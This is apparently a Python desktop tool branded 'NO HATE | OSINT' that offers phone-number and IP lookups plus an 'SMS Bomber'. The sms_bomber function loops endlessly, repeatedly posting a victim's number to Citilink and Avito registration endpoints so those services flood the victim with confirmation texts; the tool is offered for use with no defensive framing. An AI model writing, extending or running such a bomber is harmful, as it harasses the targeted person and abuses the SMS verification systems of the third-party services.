import phonenumbers
import customtkinter
import requests
import random
import string
import time
import json
import os

user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

#function's
def search_phone(phone: str):
    url = f"https://fincalculator.ru/api/tel/{phone}"
    response = requests.get(url, headers={'User-Agent': user_agent})
    
    data = json.loads(response.text)
    
    base = {
        "Country": data.get('country', "Не найдено"),
        "Region": data.get('region', "Не найдено"),
        "Oper": data.get('operator', "Не найдено")
    }
    return base
        
def search_ip(ip: str):
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url, headers={'User-Agent': user_agent})
    data = response.json()
    
    base = {
        "Country": data.get('country', "Не найдено"),
        "Region": data.get('region', "Не найдено"),
        "City": data.get('city', "Не найдено"),
        "Org": data.get('org', "Не найдено"),
    }
    return base

def sms_bomber(phone: str):
    while True:
        try:
            requests.post(f"https://www.citilink.ru/registration/confirm/phone/{phone}/")
            print('Citilink: отправлено')
        except:
            print('CitiLink: не отправлено')
        
        try:
            data = {
                
            }
            
            code = requests.post(f"https://www.avito.ru/web/1/register/code/request", data)
            print('Avito: отправлено', code)
        except:
            print('Avito: не отправлено')
        time.sleep(5)

#Menu
def phone():
    app.destroy()
    
    phone = customtkinter.CTk()
    phone.geometry("340x350")
    phone.title("NO HATE | OSINT")
    
    entry1 = customtkinter.CTkEntry(master=phone, placeholder_text="+7XXXXXXXXXX")
    entry1.place(x=170, y=230, anchor=customtkinter.CENTER)
    
    textbox = customtkinter.CTkTextbox(master=phone, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)
    
    def one():
        textbox.delete(0.0, 'end')
        info = search_phone(entry1.get())
        textbox.insert(f"0.0", f'Страна: {info["Country"]} \nРегион: {info["Region"]} \nОператор: {info["Oper"]}')

    button = customtkinter.CTkButton(master=phone, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)
    
    phone.mainloop()

def ip():
    app.destroy()
    
    ip = customtkinter.CTk()
    ip.geometry("340x350")
    ip.title("NO HATE | OSINT")
    
    entry2 = customtkinter.CTkEntry(master=ip, placeholder_text="IP...")
    entry2.place(x=170, y=230, anchor=customtkinter.CENTER)
    
    textbox = customtkinter.CTkTextbox(master=ip, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)
    
    def one():
        info = search_ip(entry2.get())
        textbox.insert(f"0.0", f'Страна: {info["Country"]} \nРегион: {info["Region"]} \nГород: {info["City"]} \nПровайдер: {info["Org"]}')

    button = customtkinter.CTkButton(master=ip, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)
    
    ip.mainloop()

def smsbomb():
    app.destroy()
    
    sms = customtkinter.CTk()
    sms.geometry("400x300")
    sms.title("NO HATE | OSINT")
    
    entry2 = customtkinter.CTkEntry(master=sms, placeholder_text="Phone...")
    entry2.place(x=200, y=110, anchor=customtkinter.CENTER)
    
    def one():
        sms_bomber(entry2.get())

    button = customtkinter.CTkButton(master=sms, text="Send", command=one)
    button.place(x=200, y=140, anchor=customtkinter.CENTER)
    
    sms.mainloop()

customtkinter.set_appearance_mode("dark")  # Modes: "System" (standard), "Dark", "Light"
customtkinter.set_default_color_theme("dark-blue")  # Themes: "blue" (standard), "green", "dark-blue"

app = customtkinter.CTk()
app.geometry("400x300")
app.title("NO HATE | OSINT")

button = customtkinter.CTkButton(master=app, text="Search Phone", command=phone)
button.place(x=200, y=110, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Search IP", command=ip)
button.place(x=200, y=140, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="SMS Bomber", command=smsbomb)
button.place(x=200, y=170, anchor=customtkinter.CENTER)

app.mainloop()